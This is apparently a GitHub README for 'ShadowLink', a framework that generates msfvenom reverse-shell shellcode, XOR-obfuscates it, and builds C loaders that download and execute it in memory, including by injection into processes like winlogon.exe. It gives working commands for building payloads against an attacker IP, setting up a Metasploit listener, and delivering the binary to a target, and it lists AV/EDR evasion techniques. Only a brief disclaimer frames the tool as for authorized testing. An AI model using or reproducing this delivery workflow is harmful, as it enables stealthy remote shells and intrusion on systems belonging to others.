# 🕶️ ShadowLink — Invisible Payload Delivery Framework

> **Where access meets invisibility.**

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/7a8be8a0-f5dc-4f2e-8f84-05665aba4220" />

ShadowLink is a **next-generation, automated framework** for generating, obfuscating, and delivering shellcode through in-memory loaders. Designed for red team operations, penetration testing, and offensive research, ShadowLink empowers attackers to deploy stealthy, fileless payloads that execute directly in memory — bypassing traditional AV/EDR detection mechanisms.

With a modular design and seamless automation, ShadowLink turns complex exploitation workflows into **one-liner commands**, making payload delivery faster, smarter, and more evasive than ever.

✨ *Crafted for control. Built for stealth.*

---

## 🔥 Key Features

✅ **Automated Shellcode Generation**  
→ Uses `msfvenom` to generate raw payloads for Linux & Windows.

✅ **XOR Obfuscation (Optional)**  
→ Encode shellcode with a custom XOR key to evade static detection.

✅ **In-Memory Execution**  
→ Payloads are downloaded and executed directly in memory — no disk writes.

✅ **Dual-Platform Support**  
→ Generate native loaders for **Linux** (via `mmap`) and **Windows** (via `VirtualAlloc` + `NtCreateThreadEx`).

✅ **Remote Process Injection (Windows)**  
→ Inject shellcode into remote processes like `winlogon.exe` using low-level NTAPI calls.

✅ **Customizable C Loaders**  
→ Fully templated C code with placeholders for URL, User-Agent, timeout, and size limits.

✅ **No Dependencies (Runtime)**  
→ Final binaries are statically linked and require no external libraries on target.

✅ **Easy Integration with Metasploit**  
→ Works seamlessly with `exploit/multi/handler`.

---

## 🛠️ Installation

```bash
git clone https://github.com/your-username/shadowlink.git
cd shadowlink
chmod +x *.sh
```

## 🛠️ Prerequisites

```bash
# Debian/Kali/Ubuntu
sudo apt update
sudo apt install \
    gcc \
    mingw-w64 \
    curl \
    libcurl4-openssl-dev \
    xxd \
    python3 \
    metasploit-framework \
    make
```
## 🚀 Quick Start
1. Generate a Linux Payload (No XOR)

```bash
./main.sh linux 10.10.14.10 5555
```
2. Generate a Windows Payload (With XOR)

```bash
./main.sh windows 10.10.14.10 4444 xor 0x42
```
### 🚀 This will:

- Generate a reverse shell payload.
- Apply XOR encoding (if enabled).
- Host the payload on your server (you can use python3 -m http.server 80).
- Build a custom C loader that downloads and executes the payload in memory.
- Output a ready-to-use binary: loader_linux or loader_windows.exe.

3. Set Up Your Listener

```bash
msfconsole -q -x "
    use exploit/multi/handler;
    set PAYLOAD [linux|windows]/x64/shell_reverse_tcp;
    set LHOST 0.0.0.0;
    set LPORT 5555;
    run
"
```

4. Deliver & Execute
Transfer the binary to the target and run it. The loader will:

- Download the shellcode from your server.
- Decode it (if XOR’d).
- Allocate executable memory.
- Execute the payload — all in memory.

## 📂 Project Structure

```text
shadowlink/
├── main.sh                     # Main orchestrator (entry point)
├── gen_txt.sh                  # Generates shellcode + XOR encoding
├── gen_xor.sh                  # Applies XOR encoding to binary
├── gen_loader.sh               # Generates basic C loader (no XOR)
├── gen_loader2.sh              # Generates XOR-aware C loader
├── loader_windows_infect.c     # Advanced: Injects into remote process (e.g. winlogon.exe)
├── Makefile                    # Cross-compilation rules
└── README.md
```

## 🧼 Evasion Techniques

- ✅ No Disk Artifacts: Shellcode fetched at runtime.
- ✅ XOR Encoding: Breaks static signatures.
- ✅ Custom User-Agent & Timeout: Mimics legitimate traffic.
- ✅ In-Memory Execution: No PE file parsing.
- ✅ NTAPI Direct Calls: Evades API hooking on Windows.


## ⚠️ Legal Disclaimer
This tool is for educational and authorized security testing only.
I do not support or condone unauthorized hacking.
Use responsibly and only on systems you have explicit permission to test.

The author assumes no liability for misuse.

## 🤝 Want to Improve ShadowLink?
Contributions are highly welcome! 

## 📜 License GPLv3

## 🌟 Acknowledgments
- Inspired by fileless malware techniques and red team tradecraft.
- Powered by msfvenom, mingw-w64, and the eternal art of offensive engineering.


| ShadowLink — Because the best connections are the ones no one sees.
| Made with ❤️ and a little bit of darkness. 



![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
